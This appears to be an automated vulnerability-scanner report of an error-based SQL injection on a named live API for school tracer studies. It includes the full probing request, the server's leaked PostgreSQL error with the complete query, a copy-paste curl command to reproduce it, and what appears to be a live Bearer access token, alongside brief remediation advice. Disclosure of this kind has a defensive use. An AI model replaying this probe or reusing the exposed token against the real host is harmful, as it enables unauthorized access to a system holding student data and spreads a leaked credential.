### Error based SQL Injection (sqli-fuzzing-899407cae926abda7aacbc1c7c612bc2000550dab06bfbbdea4a23c124235825) found on api-v3.career.support

----
**Details**: **sqli-fuzzing-899407cae926abda7aacbc1c7c612bc2000550dab06bfbbdea4a23c124235825** matched at api-v3.career.support

**Protocol**: HTTP

**Full URL**: https://api-v3.career.support/school/api/v1/tracer-study/get?page=1&name=test'

**Timestamp**: Sun Jun 15 21:35:57 +0800 WITA 2025

**Template Information**

| Key | Value |
| --- | --- |
| Name | Error based SQL Injection |
| Authors | wahyuhadi |
| Tags | sqli, error, dast |
| Severity | critical |
| Description | Direct SQL Command Injection is a technique where an attacker creates or alters existing SQL commands to expose hidden data,<br>or to override valuable ones, or even to execute dangerous system level commands on the database host.<br>This is accomplished by the application taking user input and combining it with static parameters to build an SQL query .<br> |
| tech | sql |
| severtity | high (7.5) |
| cvss-3.1 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| cvss-3.1-link | https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

**Request**
```http
GET /school/api/v1/tracer-study/get?page=1&name=test' HTTP/1.1
Host: api-v3.career.support
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.5
Authorization: Bearer 978|dT0wUvhvUDskmmrYYpjhc5H2C3Io3vCCbFc1furo
Connection: keep-alive
Origin: https://school-v3.career.support
Priority: u=0
Referer: https://school-v3.career.support/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site


```

**Response**
```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 953
Access-Control-Allow-Origin: *
Alt-Svc: h3=":443"; ma=86400
Cache-Control: no-cache, private
Cf-Cache-Status: DYNAMIC
Cf-Ray: 9502741c89618219-SIN
Content-Type: application/json
Date: Sun, 15 Jun 2025 13:35:57 GMT
Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=endHm6e2a8J8Nvjooan7O0ONEyFXPm54RfVLMCCxBhK%2Ft%2FimBTW62TcCMjCK262oHKvEvMVi5bRIS5vfUIo2PYiXpZiv38ZBFMU20tLbxpbKirxWmQ%3D%3D"}]}
Server: cloudflare
X-Ratelimit-Limit: 60
X-Ratelimit-Remaining: 57

{"data":null,"message":"SQLSTATE[42601]: Syntax error: 7 ERROR:  unterminated quoted string at or near \\"'test'') and \\"tracer_studies\\".\\"deleted_at\\" is null\\"\\nLINE 1: ...ol_id = 23 and lower(tracer_studies.name) ~ lower('test'') a...\\n                                                             ^ (Connection: pgsql, SQL: select count(*) as aggregate from \\"tracer_studies\\" left join (select max(detail_mx.id) as detail_id, detail_mx.tracer_study_id from \\"tracer_studies_histories\\" as \\"detail_mx\\" group by \\"detail_mx\\".\\"tracer_study_id\\") as \\"detail_max\\" on \\"tracer_studies\\".\\"id\\" = \\"detail_max\\".\\"tracer_study_id\\" left join (select detail_data.id, detail_data.status from \\"tracer_studies_histories\\" as \\"detail_data\\") as \\"detail\\" on \\"detail\\".\\"id\\" = \\"detail_max\\".\\"detail_id\\" where tracer_studies.school_id = 23 and lower(tracer_studies.name) ~ lower('test'') and \\"tracer_studies\\".\\"deleted_at\\" is null)","status":500}
```
**Metadata:**

- path: test'

**Fixing**

- Prepared statements ensure that user input is treated as data, not executable SQL code. This completely prevents SQL injection.
- Stored procedures execute SQL commands safely within the database, reducing the risk of injection when properly implemented.
- Never display database error messages to users.
- Ensure that the database user only has necessary privileges (e.g., no DROP, ALTER, EXECUTE permissions for web users).




**CURL command**
```sh
curl -X 'GET' -d '' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Accept-Language: en-US,en;q=0.5' -H 'Authorization: Bearer 978|dT0wUvhvUDskmmrYYpjhc5H2C3Io3vCCbFc1furo' -H 'Connection: keep-alive' -H 'Host: api-v3.career.support' -H 'Origin: https://school-v3.career.support' -H 'Priority: u=0' -H 'Referer: https://school-v3.career.support/' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-site' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0' 'https://api-v3.career.support/school/api/v1/tracer-study/get?page=1&name=test'\\'''
```


----

Eagle Pulsar Team :  > From Home With Love